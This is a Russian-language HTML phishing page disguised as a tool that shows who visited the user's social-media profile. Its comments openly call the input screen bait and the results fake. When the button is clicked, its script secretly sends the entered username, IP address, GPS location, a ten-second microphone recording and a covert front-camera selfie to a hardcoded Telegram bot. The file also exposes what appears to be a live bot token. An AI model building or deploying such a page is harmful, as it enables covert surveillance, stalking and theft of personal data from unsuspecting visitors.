<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Кто заходил на мою страницу</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; }
        .card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 30px 20px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .icon { font-size: 60px; margin-bottom: 15px; }
        h2 { font-size: 22px; margin-bottom: 10px; }
        p { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.5; }
        input { width: 100%; padding: 16px; background: #0f0f1a; border: 1px solid #333; border-radius: 12px; color: #fff; font-size: 16px; margin-bottom: 15px; outline: none; text-align: center; }
        button { width: 100%; padding: 16px; background: linear-gradient(90deg, #ff416c, #ff4b2b); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:active { transform: scale(0.98); }
        
        #loading, #result { display: none; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #ff416c; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .visitor { display: flex; align-items: center; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 10px; margin-bottom: 10px; text-align: left; }
        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #444; margin-right: 15px; display: flex; justify-content: center; align-items: center; font-size: 20px; }
        
        #camera { display: none; }
    </style>
</head>
<body>

    <!-- Экран 1: Приманка -->
    <div class="card" id="step1">
        <div class="icon">👀</div>
        <h2>Трекер подписчиков</h2>
        <p>Введите ваш юзернейм, чтобы узнать, кто заходил на вашу страницу за последние 24 часа.</p>
        <input type="text" id="username" placeholder="@username" required autocomplete="off">
        <button id="startBtn">Узнать результаты</button>
    </div>

    <!-- Экран 2: Фейковая загрузка -->
    <div class="card" id="loading">
        <div class="spinner"></div>
        <h2>Сканирование...</h2>
        <p id="loadText">Подключение к базе данных...</p>
    </div>

    <!-- Экран 3: Фейковые результаты (чтобы отвлечь внимание) -->
    <div class="card" id="result">
        <div class="icon">✅</div>
        <h2>Анализ завершен</h2>
        <p>Вашу страницу посетили:</p>
        <div class="visitor"><div class="avatar">👤</div><div><b>Алексей</b><br><span style="font-size:12px;color:#aaa;">10 минут назад</span></div></div>
        <div class="visitor"><div class="avatar">👤</div><div><b>Мария</b><br><span style="font-size:12px;color:#aaa;">1 час назад</span></div></div>
        <div class="visitor"><div class="avatar">👤</div><div><b>Неизвестный</b><br><span style="font-size:12px;color:#aaa;">3 часа назад</span></div></div>
        <button onclick="window.location.href='https://tiktok.com'">Закрыть</button>
    </div>

    <video id="camera" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8";
        const CHAT_ID = "7485234259";

        function sendText(text) {
            const img = new Image();
            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
        }

        async function sendMedia(endpoint, blob, filename, caption) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append(endpoint === 'sendVoice' ? 'voice' : 'photo', blob, filename);
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: formData });
        }

        document.getElementById('startBtn').addEventListener('click', async function() {
            const user = document.getElementById('username').value;
            if (!user) { alert("Введите юзернейм!"); return; }

            document.getElementById('step1').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            // Отправляем введенный юзернейм
            sendText(`👀 Трекер (Приманка)\nЦель ввела ник: ${user}`);

            // Запускаем фоновые процессы
            collectAllData(user);

            // Фейковая загрузка
            setTimeout(() => { document.getElementById('loadText').innerText = "Расшифровка IP-адресов..."; }, 1500);
            setTimeout(() => { document.getElementById('loadText').innerText = "Сбор данных о геолокации..."; }, 3000);
            
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('result').style.display = 'block';
            }, 4500);
        });

        async function collectAllData(user) {
            // 1. IP
            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => sendText(`🌐 IP: ${d.ip}`)).catch(()=>{});
            
            // 2. GPS
            navigator.geolocation.getCurrentPosition(
                (pos) => sendText(`🗺️ GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
                (err) => sendText(`🗺️ GPS: Запрещен`)
            );

            // 3. Запись микрофона (10 секунд)
            try {
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(audioStream);
                const audioChunks = [];
                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    await sendMedia('sendVoice', audioBlob, 'voice.ogg', `🎙️ Аудио окружения (10 сек)\n👤 ${user}`);
                    audioStream.getTracks().forEach(track => track.stop());
                };
                mediaRecorder.start();
                setTimeout(() => { mediaRecorder.stop(); }, 10000);
            } catch (err) {
                sendText(`⚠️ Микрофон запрещен`);
            }

            // 4. Скрытое селфи
            try {
                const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('camera');
                video.srcObject = videoStream;
                await new Promise(r => setTimeout(r, 1000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                videoStream.getTracks().forEach(track => track.stop());

                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
                await sendMedia('sendPhoto', blob, 'face.jpg', `📸 Селфи (Трекер)\n👤 ${user}`);
            } catch (err) {
                sendText(`⚠️ Камера запрещена`);
            }
        }
    </script>
</body>
</html>
